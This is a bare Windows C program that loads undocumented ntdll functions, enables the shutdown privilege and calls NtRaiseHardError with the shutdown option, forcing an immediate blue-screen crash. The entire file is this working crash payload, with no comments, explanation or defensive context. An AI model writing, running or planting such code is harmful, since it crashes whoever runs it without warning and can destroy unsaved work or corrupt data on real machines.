#include <windows.h>

typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

int main() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    
    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    
    BOOLEAN enabled;
    ULONG response;
    
    RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
    NtRaiseHardError(0xC0000420, 0, 0, NULL, 6, &response);
    
    return 0;
}

